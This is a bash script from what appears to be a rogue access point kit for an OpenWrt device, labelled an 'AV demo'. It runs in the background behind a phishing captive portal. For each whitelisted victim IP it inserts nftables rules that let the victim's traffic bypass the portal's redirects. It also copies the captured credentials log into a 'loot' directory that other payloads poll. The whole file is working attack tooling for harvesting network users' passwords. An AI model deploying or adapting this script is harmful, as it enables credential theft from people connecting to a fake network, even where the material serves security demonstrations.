#!/bin/bash
# Whitelist monitor - watches for new IPs and applies firewall bypass rules
# Also handles copying credentials to persistent loot folder
# Runs in background, launched by 1_setup_portal/payload.sh
# Adapted from goodportal_configure/whitelist_monitor.sh for AV demo

WHITELIST_FILE="/tmp/av_demo_whitelist.txt"
PROCESSED_FILE="/tmp/av_demo_processed.txt"
CREDENTIALS_FILE="/root/loot/av_demo/credentials.log"
LOOTDIR="/root/loot/av_demo"
# shellcheck disable=SC2034  # used by sourcing scripts
PORTAL_IP="172.16.52.1"
SLEEP_INTERVAL=1

# Initialize processed file and loot directory
touch "$PROCESSED_FILE"
mkdir -p "$LOOTDIR"

logger -t av-demo-whitelist "Whitelist monitor started (PID: $$)"
logger -t av-demo-whitelist "Credentials will be saved to: $LOOTDIR"

# Track last known credentials file size to detect new entries without truncating
LAST_CREDS_SIZE=0

while true; do
    # Check if whitelist file exists
    if [ ! -f "$WHITELIST_FILE" ]; then
        sleep "$SLEEP_INTERVAL"
        continue
    fi

    # Read whitelist and process new entries (contains IPs directly)
    while IFS= read -r ip; do
        # Skip empty lines and comments
        [ -z "$ip" ] && continue
        [[ "$ip" =~ ^# ]] && continue

        # Trim whitespace
        ip=$(echo "$ip" | tr -d ' ')

        # Validate IP address format
        if ! echo "$ip" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
            logger -t av-demo-whitelist "Warning: Invalid IP format: $ip"
            continue
        fi

        # Skip if already processed
        if grep -q "^${ip}$" "$PROCESSED_FILE" 2>/dev/null; then
            continue
        fi

        logger -t av-demo-whitelist "Whitelisting IP: $ip"

        # Add firewall bypass rules via nftables for OpenWrt
        # NOTE: These rules are temporary and only exist in memory
        # They will be cleared when firewall restarts or device reboots
        # Using 'insert' to add rules at TOP of chain (before redirect rules)

        # Bypass DNS redirects for this IP
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" tcp dport 53 counter accept 2>/dev/null
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" udp dport 53 counter accept 2>/dev/null

        # Bypass HTTP/HTTPS redirects for this IP
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" tcp dport 80 counter accept 2>/dev/null
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" tcp dport 443 counter accept 2>/dev/null

        # Allow forwarding for this IP
        nft insert rule inet fw4 forward_lan ip saddr "$ip" counter accept 2>/dev/null

        logger -t av-demo-whitelist "Firewall rules added for $ip"

        # Mark as processed
        echo "$ip" >> "$PROCESSED_FILE"

    done < "$WHITELIST_FILE"

    # Backup credentials periodically (do NOT truncate — payloads 2/3 poll this file)
    if [ -f "$CREDENTIALS_FILE" ] && [ -s "$CREDENTIALS_FILE" ]; then
        current_size=$(wc -c < "$CREDENTIALS_FILE" 2>/dev/null || echo 0)
        if [ "$current_size" != "$LAST_CREDS_SIZE" ]; then
            timestamp=$(date +%Y-%m-%d_%H-%M-%S)
            loot_file="$LOOTDIR/credentials_$timestamp.log"
            cp "$CREDENTIALS_FILE" "$loot_file"
            LAST_CREDS_SIZE="$current_size"
            logger -t av-demo-whitelist "Backed up credentials to: $loot_file"
        fi
    fi

    sleep "$SLEEP_INTERVAL"
done
